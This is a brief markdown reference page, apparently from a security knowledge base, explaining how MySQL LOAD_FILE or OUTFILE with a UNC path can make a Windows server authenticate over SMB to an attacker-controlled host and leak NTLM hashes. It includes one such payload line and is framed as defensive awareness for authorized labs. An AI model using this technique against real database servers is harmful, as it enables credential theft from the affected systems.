---
title: "MySQL UNC paths and NTLM: LOAD_FILE and OUTFILE to SMB shares"
description: Windows environments where SQL causes SMB authentication to an attacker-controlled host, authorized lab only.
keywords:
  - UNC path
  - NTLM
---

# UNC path / NTLM

## Context

Library Structure **UNC Path NTLM Hash Stealing**. **LOAD_FILE('\\\\host\\share')** can trigger **SMB** auth. Document for **defense** awareness on app servers co-located with SQL.
